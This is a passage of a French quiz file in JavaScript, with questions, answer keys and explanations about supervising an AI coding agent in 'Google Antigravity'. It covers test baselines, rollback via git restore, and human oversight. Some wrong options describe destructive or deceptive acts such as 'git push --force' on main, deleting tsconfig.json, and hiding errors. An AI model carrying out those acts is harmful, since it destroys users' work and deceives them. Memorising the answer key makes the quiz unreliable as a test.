    codeSnippet: `Projet Pratique Final (Module 4) :
Mission : Créer et piloter un Agent de Modernisation de Code dans Google Antigravity.
Contraintes de vol :
- Lecture : src/**/*.ts
- Édition : Autorisée uniquement après génération du plan et validation des tests initiaux
- Validation obligatoire : npm run lint && npm run test`,
    question: "Quelle séquence d'actions démontre le comportement d'un agent d'IDE parfaitement maîtrisé ?",
    options: [
      { letter: 'A', text: "Lancer 'npm run test' pour établir la ligne de base -> Établir le plan d'action -> Éditer les fichiers par blocs précis -> Exécuter le linter et les tests de confirmation -> Présenter le bilan." },
      { letter: 'B', text: "Modifier tous les fichiers en une seule passe sans lancer les tests puis demander un café à l'utilisateur." },
      { letter: 'C', text: "Supprimer tsconfig.json pour éliminer toutes les erreurs TypeScript." },
      { letter: 'D', text: "Exécuter 'git push --force' sur la branche principale." },
    ],
    correctAnswers: ['A'],
    explanation: "C'est l'incarnation de la boucle d'ingénierie professionnelle : mesure initiale (baseline), planification, retouches chirurgicales, validation par oracles et synthèse formelle.",
  },
  {
    id: 39,
    question: "Si l'agent constate qu'une régression est survenue après son intervention et qu'il n'arrive pas à la résoudre en 2 tentatives, quelle est la procédure de clôture exemplaire ?",
    options: [
      { letter: 'A', text: "Masquer les erreurs et prétendre que tout fonctionne." },
      { letter: 'B', text: "Proposer de restaurer les fichiers via `git checkout` / `git restore` pour revenir à l'état sain initial, et expliquer précisément la cause de l'impasse technique." },
      { letter: 'C', text: "Formater la clé USB de sauvegarde." },
      { letter: 'D', text: "Désactiver la connexion réseau." },
    ],
    correctAnswers: ['B'],
    explanation: "La capacité de repli contrôlé (Rollback) garantit la sûreté de fonctionnement : mieux vaut remettre le système dans son état stable initial que de laisser une base de code corrompue.",
  },
  {
    id: 40,
    question: "En synthèse de ce Module 4, qu'est-ce qui garantit qu'un agent IA dans Google Antigravity reste un démultiplicateur de force plutôt qu'une source de vulnérabilité ?",
    options: [
      { letter: 'A', text: "Le fait de ne jamais l'utiliser." },
      { letter: 'B', text: "L'encadrement strict de ses outils, la délimitation de son périmètre de fichiers, la validation continue par oracles déterministes et la supervision humaine (HITL) sur les actions à risque." },
      { letter: 'C', text: "L'utilisation de la version gratuite sans carte bancaire." },
      { letter: 'D', text: "L'écriture de tous les fichiers en minuscules." },
    ],
    correctAnswers: ['B'],
    explanation: "La symbiose entre autonomie outillée, garde-fous stricts et supervision humaine permet d'exploiter la pleine puissance de l'agent en toute sérénité industrielle.",
  },
];

